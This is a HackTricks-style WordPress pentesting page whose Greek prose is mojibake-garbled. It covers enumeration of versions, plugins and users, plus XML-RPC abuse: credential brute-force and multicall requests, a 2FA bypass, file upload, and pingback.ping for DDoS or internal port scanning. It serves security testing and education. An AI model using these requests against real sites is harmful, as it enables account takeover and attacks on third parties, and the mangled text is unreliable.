# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

- **Uploaded** Î±ÏÏ‡ÎµÎ¯Î± Ï€Î·Î³Î±Î¯Î½Î¿Ï…Î½ ÏƒÏ„Î¿: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Î¤Î± Î±ÏÏ‡ÎµÎ¯Î± Î¸ÎµÎ¼Î¬Ï„Ï‰Î½ Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ /wp-content/themes/,** Î¿Ï€ÏŒÏ„Îµ Î±Î½ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± php Ï„Î¿Ï… Î¸Î­Î¼Î±Ï„Î¿Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ path. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **theme twentytwelve** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **404.php** ÏƒÏ„Î¿: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Î†Î»Î»Î· Ï‡ÏÎ®ÏƒÎ¹Î¼Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Î£Ï„Î¿ **wp-config.php** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿Î½ root ÎºÏ‰Î´Î¹ÎºÏŒ Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
- Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Ï€ÏÎ¿Ï‚ Î­Î»ÎµÎ³Ï‡Î¿: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ÎšÏÏÎ¹Î± Î±ÏÏ‡ÎµÎ¯Î± WordPress**

- `index.php`
- `license.txt` Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï‡ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… WordPress Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î·.
- `wp-activate.php` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Î¼Î­ÏƒÏ‰ email ÎºÎ±Ï„Î¬ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… site WordPress.
- Î¦Î¬ÎºÎµÎ»Î¿Î¹ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ (Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡Î¿Ï…Î½ Î¼ÎµÏ„Î¿Î½Î¿Î¼Î±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± ÎºÏÏ…Ï†Ï„ÎµÎ¯):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Ï€Î¿Ï… Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… WordPress Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼Îµ Ï„Î¿ HTTP Ï‰Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÎ±Î¹ Ï„Î¿ XML Ï‰Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. Î‘Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎµÎ¯Î´Î¿Ï…Ï‚ Î· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î­Ï‡ÎµÎ¹ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿ WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- ÎŸ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ `wp-content` ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÏÎ¹Î¿Ï‚ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ plugins ÎºÎ±Î¹ themes.
- `wp-content/uploads/` ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î±Î½ÎµÎ²ÎµÎ¯ ÏƒÏ„Î·Î½ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±.
- `wp-includes/` ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÏŒÏ€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ Ï„Î± core Î±ÏÏ‡ÎµÎ¯Î±, ÏŒÏ€Ï‰Ï‚ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÎ¬, Î³ÏÎ±Î¼Î¼Î±Ï„Î¿ÏƒÎµÎ¹ÏÎ­Ï‚, Î±ÏÏ‡ÎµÎ¯Î± JavaScript ÎºÎ±Î¹ widgets.
- `wp-sitemap.xml` Î£Îµ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Wordpress 5.5 ÎºÎ±Î¹ Î½ÎµÏŒÏ„ÎµÏÎµÏ‚, Ï„Î¿ Worpress Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± sitemap XML Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Îµ ÏŒÎ»Î± Ï„Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± posts ÎºÎ±Î¹ Ï„Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± queryable post types ÎºÎ±Î¹ taxonomies.

**Post exploitation**

- Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `wp-config.php` Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ WordPress Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚, Î¿ host Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚, username ÎºÎ±Î¹ password, authentication keys and salts, ÎºÎ±Î¹ Ï„Î¿ prefix Ï„Ï‰Î½ Ï€Î¹Î½Î¬ÎºÏ‰Î½ Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚. Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿ DEBUG mode, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„ÏÏ€Î¹ÏƒÎ· Ï€ÏÎ¿Î²Î»Î·Î¼Î¬Ï„Ï‰Î½.

### Î”Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î§ÏÎ·ÏƒÏ„ÏÎ½

- **Administrator**
- **Editor**: Î”Î·Î¼Î¿ÏƒÎ¹ÎµÏÎµÎ¹ ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î´Î¹ÎºÎ­Ï‚ Ï„Î¿Ï… ÎºÎ±Î¹ Ï„Ï‰Î½ Î¬Î»Î»Ï‰Î½ Î±Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚
- **Author**: Î”Î·Î¼Î¿ÏƒÎ¹ÎµÏÎµÎ¹ ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î´Î¹ÎºÎ­Ï‚ Ï„Î¿Ï… Î±Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚
- **Contributor**: Î“ÏÎ¬Ï†ÎµÎ¹ ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î±Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¹Ï‚ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹
- **Subscriber**: Î ÎµÏÎ¹Î·Î³ÎµÎ¯Ï„Î±Î¹ Î±Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ Ï€ÏÎ¿Ï†Î¯Î» Ï„Î¿Ï…

## **Passive Enumeration**

### **Î›Î®ÏˆÎ· Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ WordPress**

Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± `/license.txt` Î® `/readme.html`

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿Î½ **Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ±** Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ (Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚

![](<../../images/image (533).png>)

- Î±ÏÏ‡ÎµÎ¯Î± JavaScript

![](<../../images/image (524).png>)

### Î›Î®ÏˆÎ· Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Î›Î®ÏˆÎ· Î¸ÎµÎ¼Î¬Ï„Ï‰Î½
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Î•Î¾Î±Î³Ï‰Î³Î® ÎµÎºÎ´ÏŒÏƒÎµÏ‰Î½ Î³ÎµÎ½Î¹ÎºÎ¬
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Î•Î½ÎµÏÎ³Î® Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ·

### Plugins and Themes

Î Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Î´ÎµÎ½ Î¸Î± ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏŒÎ»Î± Ï„Î± Plugins and Themes. Î“Î¹Î± Î½Î± Ï„Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ ÏŒÎ»Î±, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **actively Brute Force a list of Plugins and Themes** (ÎµÎ»Ï€Î¯Î¶Î¿Ï…Î¼Îµ ÏŒÏ„Î¹ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î»Î¯ÏƒÏ„ÎµÏ‚).

### Î§ÏÎ®ÏƒÏ„ÎµÏ‚

- **ID Brute:** Î‘Ï€Î¿ÎºÏ„Î¬Ï„Îµ Î­Î³ÎºÏ…ÏÎ¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î±Ï€ÏŒ Î­Î½Î± WordPress site Î¼Î­ÏƒÏ‰ Brute Forcing Ï„Ï‰Î½ IDs Ï‡ÏÎ·ÏƒÏ„ÏÎ½:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Î‘Î½ Î¿Î¹ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ **200** Î® **30X**, Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ id ÎµÎ¯Î½Î±Î¹ **Î­Î³ÎºÏ…ÏÎ¿**. Î‘Î½ Î· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ **400**, Ï„ÏŒÏ„Îµ Ï„Î¿ id ÎµÎ¯Î½Î±Î¹ **Î¬ÎºÏ…ÏÎ¿**.

- **wp-json:** ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î­Î½Î± query:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ÎˆÎ½Î± Î¬Î»Î»Î¿ endpoint `/wp-json/` Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎ¯Î½Î±Î¹:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ endpoint ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î¼ÏŒÎ½Î¿ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎºÎ¬Î½ÎµÎ¹ Î¼Î¹Î± Î´Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ·. **Î˜Î± Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î±Ï…Ï„Î® Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î±**.

Î•Ï€Î¯ÏƒÎ·Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **/wp-json/wp/v2/pages** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP.

- **Login username enumeration**: ÎŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ **`/wp-login.php`**, Ï„Î¿ **Î¼Î®Î½Ï…Î¼Î±** ÎµÎ¯Î½Î±Î¹ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ** ÎºÎ±Î¹ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ Î±Î½ Ï„Î¿ **username** Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î® ÏŒÏ‡Î¹.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± [using this](https://github.com/relarizky/wpxploit) for example).

Î“Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³ÏŒ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ _**/xmlrpc.php**_ ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±:

**ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Î”Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** ÎµÎ¯Î½Î±Î¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± brute-force Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½. Î•Î¬Î½ Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï€Î¿Î¹Î± Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Î¤Î¿ Î¼Î®Î½Ï…Î¼Î± _"Incorrect username or password"_ Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î¼Îµ ÎºÏ‰Î´Î¹ÎºÏŒ 200 Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ ÎµÎ¬Î½ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î­Î³ÎºÏ…ÏÎ±.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± ÏƒÏ‰ÏƒÏ„Î¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿. Î£Ï„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î¸Î± ÎµÎ¼Ï†Î±Î½Î¹ÏƒÏ„ÎµÎ¯ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï€ÏÎ¿Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î± ÎºÎ±Î¹ ÏŒÏ‡Î¹ Î³Î¹Î± Î±Î½Î¸ÏÏÏ€Î¿Ï…Ï‚, ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Ï€Î±Î»Î¹Î¬, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ 2FA. ÎˆÏ„ÏƒÎ¹, Î±Î½ Î­Ï‡ÎµÏ„Îµ Î­Î³ÎºÏ…ÏÎ± creds Î±Î»Î»Î¬ Î· ÎºÏÏÎ¹Î± ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î¼Îµ 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ Ï€Î±ÏÏŒÎ»Î± Î±Ï…Ï„Î¬ Î½Î± Ï†Ï„Î¬ÏƒÎµÏ„Îµ ÏƒÎµ RCE ÏŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯ Î¿ Ippsec ÏƒÏ„Î¿ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Î•Î¬Î½ Î»Î¬Î²ÎµÏ„Îµ **faultCode** Î¼Îµ Ï„Î¹Î¼Î® **Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ·** Î±Ï€ÏŒ **0** (17), Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î· Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î®.

